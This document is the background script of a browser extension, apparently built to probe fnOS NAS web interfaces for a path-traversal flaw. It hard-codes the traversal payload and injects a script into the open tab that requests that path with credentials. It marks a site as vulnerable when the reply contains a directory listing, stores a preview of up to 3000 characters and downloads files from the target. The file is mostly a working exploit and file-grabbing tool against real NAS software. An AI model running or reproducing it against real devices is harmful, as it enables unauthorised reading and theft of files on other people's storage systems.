(() => {
  const api = (typeof browser !== 'undefined') ? browser : chrome;

  const VULN_PATH = "/app-center-static/serviceicon/myapp/%7B0%7D/?size=../../../../";

  // 图标配置
  const ICONS = {
    gray: {
      16: "icons/fnos_gray_16.png",
      48: "icons/fnos_gray_48.png",
      128: "icons/fnos_gray_128.png"
    },
    color: {
      16: "icons/fnos_color_16.png",
      48: "icons/fnos_color_48.png",
      128: "icons/fnos_color_128.png"
    }
  };

  // 更新指定标签页的图标
  async function updateIcon(tabId, vulnerable) {
    try {
      await api.action.setIcon({
        tabId: tabId,
        path: vulnerable ? ICONS.color : ICONS.gray
      });
      
      // 同时更新徽章
      if (vulnerable) {
        await api.action.setBadgeText({ tabId: tabId, text: "!" });
        await api.action.setBadgeBackgroundColor({ tabId: tabId, color: "#f85149" });
      } else {
        await api.action.setBadgeText({ tabId: tabId, text: "" });
      }
    } catch (e) {
      // 标签页可能已关闭
    }
  }

  // 根据 origin 查找并更新所有匹配标签页的图标
  async function updateIconForOrigin(origin, vulnerable) {
    try {
      const tabs = await api.tabs.query({});
      for (const tab of tabs) {
        if (tab.url) {
          try {
            const tabOrigin = new URL(tab.url).origin;
            if (tabOrigin === origin) {
              await updateIcon(tab.id, vulnerable);
            }
          } catch {}
        }
      }
    } catch {}
  }

  async function getStore() {
    return await api.storage.local.get({ results: {} });
  }

  async function saveResult(origin, data) {
    const store = await getStore();
    const results = store.results || {};
    results[origin] = data;
    await api.storage.local.set({ results });
    
    // 保存后更新图标
    await updateIconForOrigin(origin, data.vulnerable);
  }

  // 监听标签页更新，检查是否有已知漏洞
  api.tabs.onUpdated.addListener(async (tabId, changeInfo, tab) => {
    if (changeInfo.status === 'complete' && tab.url) {
      try {
        const origin = new URL(tab.url).origin;
        const store = await getStore();
        const result = (store.results || {})[origin];
        
        if (result && result.vulnerable) {
          await updateIcon(tabId, true);
        } else {
          await updateIcon(tabId, false);
        }
      } catch {}
    }
  });

  // 监听标签页激活，更新图标状态
  api.tabs.onActivated.addListener(async (activeInfo) => {
    try {
      const tab = await api.tabs.get(activeInfo.tabId);
      if (tab.url) {
        const origin = new URL(tab.url).origin;
        const store = await getStore();
        const result = (store.results || {})[origin];
        await updateIcon(activeInfo.tabId, result?.vulnerable || false);
      }
    } catch {}
  });

  api.runtime.onMessage.addListener((msg, sender, sendResponse) => {
    (async () => {
      if (!msg || !msg.type) return;

      // 下载文件
      if (msg.type === "FNOS_DOWNLOAD_FILE") {
        const { url, filename } = msg;
        try {
          await api.downloads.download({
            url: url,
            filename: filename,
            saveAs: false,
            conflictAction: 'uniquify'
          });
          sendResponse({ ok: true });
        } catch (e) {
          sendResponse({ ok: false, error: e.message });
        }
        return;
      }

      // 收到目录列表结果
      if (msg.type === "FNOS_DIRECTORY_LISTING") {
        const { origin, result } = msg;
        if (!origin || !result) return;
        await saveResult(origin, result);
        
        // 更新发送者标签页的图标
        if (sender.tab?.id) {
          await updateIcon(sender.tab.id, result.vulnerable);
        }
        
        sendResponse({ ok: true });
        return;
      }

      // 收到探测结果
      if (msg.type === "FNOS_PROBE_RESULT") {
        const { origin, result } = msg;
        if (!origin || !result) return;
        await saveResult(origin, result);
        
        // 更新发送者标签页的图标
        if (sender.tab?.id) {
          await updateIcon(sender.tab.id, result.vulnerable);
        }
        
        sendResponse({ ok: true });
        return;
      }

      // 获取结果
      if (msg.type === "FNOS_GET_RESULT") {
        const store = await getStore();
        const result = (store.results || {})[msg.origin] || null;
        sendResponse({ ok: true, result });
        return;
      }

      // 手动扫描
      if (msg.type === "FNOS_MANUAL_SCAN") {
        const { origin, tabId } = msg;
        try {
          const results = await api.scripting.executeScript({
            target: { tabId: tabId },
            func: (vulnPath) => {
              return new Promise(async (resolve) => {
                const url = location.origin + vulnPath;
                try {
                  const resp = await fetch(url, { method: 'GET', credentials: 'include' });
                  const text = await resp.text().catch(() => '');
                  const hasLinks = /<a\s+href=/i.test(text);
                  const hasPre = /<pre>/i.test(text);
                  const isVuln = resp.ok && text.length > 50 && (hasLinks || hasPre);
                  resolve({
                    probed: true,
                    url: url,
                    status: resp.status,
                    length: text.length,
                    vulnerable: isVuln,
                    preview: text.substring(0, 3000),
                    subPath: ""
                  });
                } catch (e) {
                  resolve({ probed: true, url: url, status: 0, vulnerable: false, error: e.message });
                }
              });
            },
            args: [VULN_PATH]
          });

          const probeResult = results?.[0]?.result || { probed: false, error: 'inject failed' };
          const result = {
            origin,
            time: new Date().toISOString(),
            fingerprint: false,
            manual: true,
            ...probeResult
          };

          await saveResult(origin, result);
          
          // 更新图标
          await updateIcon(tabId, result.vulnerable);
          
          sendResponse({ ok: true, result });
        } catch (e) {
          sendResponse({ ok: false, error: e.message });
        }
        return;
      }

      // 刷新当前页面的目录列表
      if (msg.type === "FNOS_REFRESH_TAB") {
        const { tabId } = msg;
        try {
          await api.tabs.sendMessage(tabId, { type: "FNOS_REFRESH_LISTING" });
          sendResponse({ ok: true });
        } catch (e) {
          sendResponse({ ok: false, error: e.message });
        }
        return;
      }

      // 清空记录
      if (msg.type === "FNOS_CLEAR") {
        await api.storage.local.set({ results: {} });
        
        // 重置所有标签页图标
        try {
          const tabs = await api.tabs.query({});
          for (const tab of tabs) {
            await updateIcon(tab.id, false);
          }
        } catch {}
        
        sendResponse({ ok: true });
        return;
      }
    })().catch(e => {
      try { sendResponse({ ok: false, error: String(e) }); } catch (_) {}
    });

    return true;
  });
})();
